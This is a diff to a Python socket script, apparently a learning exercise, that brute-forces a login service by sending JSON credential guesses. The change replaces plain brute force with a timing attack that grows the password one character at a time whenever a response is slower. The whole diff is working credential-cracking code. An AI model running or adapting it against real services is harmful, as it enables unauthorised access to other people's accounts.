@@ -1,6 +1,7 @@
 import socket
 import sys
 import itertools
+import time
 from typing import TextIO
 
 
@@ -52,18 +53,30 @@ def hacking(host: str, port: str):
             client_socket.close()
             print('Login not found')
             return
-
-        for p_len in range(2, 5):
-            for password in password_gen(p_len):
-                strjson = f'{{ "login": "{right_login}", "password": "{password}"}}'
+        password_prefix = ''
+        last_time = 100000
+        while True:
+            for password in password_gen(1):
+                strjson = f'{{ "login": "{right_login}", "password": "{password_prefix + password}"}}'
+                starttime = time.time()
                 client_socket.send(strjson.encode('utf8'))
                 response = client_socket.recv(1024).decode('utf8')
+                now_time = round((time.time() - starttime) * 100)
+                # print(now_time > last_time, strjson, response)
                 # print(strjson, response)
                 if "Connection success!" in response:
                     client_socket.close()
                     print(strjson)
                     return
 
+                if len(password_prefix)>12:
+                    print(strjson)
+                    return
+
+                if now_time > last_time:
+                    password_prefix += password
+                    break
+                last_time = now_time
 
 if __name__ == '__main__':
     args = sys.argv
@@ -74,7 +87,7 @@ if __name__ == '__main__':
     hacking(*args[1:])
     # test_pass()
     # for item in password_gen(2):
-    # print(list(password_gen(3)))
+    # print(list(password_gen(1)))
     # print(len(list(password_gen(3))))
     # print(set(password_gen(3)))
     # print(len(set(password_gen(3))))
